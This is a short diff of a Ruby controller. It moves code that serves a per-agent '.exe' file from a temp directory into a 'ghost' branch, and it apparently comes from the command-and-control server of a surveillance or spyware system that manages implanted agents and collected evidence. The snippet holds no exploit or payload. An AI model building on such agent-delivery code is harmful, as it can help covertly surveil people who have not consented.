@@ -731,18 +731,18 @@ class AgentController < RESTController
       agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_GHOST
       agent.stat[:ghost] = true
       agent.save
+
+      file = "#{agent.ident}:#{agent.instance}.exe"
+
+      return not_found() unless File.exist? Config.instance.temp(file)
+
+      content = File.binread(Config.instance.temp(file))
+      FileUtils.rm_rf Config.instance.temp(file)
+
+      trace :info, "[#{@request[:peer]}] Ghost Agent sent: #{file} (#{content.bytesize} bytes)"
+
+      return ok(content, {content_type: 'binary/octetstream'})
     end
-
-    file = "#{agent.ident}:#{agent.instance}.exe"
-
-    return not_found() unless File.exist? Config.instance.temp(file)
-
-    content = File.binread(Config.instance.temp(file))
-    FileUtils.rm_rf Config.instance.temp(file)
-
-    trace :info, "[#{@request[:peer]}] Ghost Agent sent: #{file} (#{content.bytesize} bytes)"
-
-    return ok(content, {content_type: 'binary/octetstream'})
   end
 
   def activate_ghost
